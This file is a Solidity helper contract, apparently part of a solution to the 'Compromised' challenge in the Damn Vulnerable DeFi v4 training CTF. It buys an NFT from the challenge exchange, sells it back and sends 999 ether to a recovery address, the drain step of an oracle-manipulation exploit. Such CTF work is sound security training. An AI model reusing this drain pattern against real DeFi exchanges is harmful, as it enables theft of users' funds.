// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {VmSafe} from "forge-std/Vm.sol";

import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract CompromisedExploiter is Test {

    Exchange exchange;
    DamnValuableNFT nft;
    TrustfulOracle oracle;
    address recovery;

    constructor(Exchange _exchange, TrustfulOracle _oracle, address _recovery) payable {
        exchange = Exchange(_exchange);
        nft = exchange.token();
        oracle = TrustfulOracle(_oracle);
        recovery = _recovery;
    }

    function buy() external returns (uint256) {
        uint256 id = exchange.buyOne{value: address(this).balance}();
        return id;
    }

    function sell(uint256 nftId) external {
        nft.approve(address(exchange), nftId);
        exchange.sellOne(nftId);
    }

    function recover() external {
        payable(recovery).transfer(999 ether);
    }

    function onERC721Received(
        address, 
        address, 
        uint256, 
        bytes calldata
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}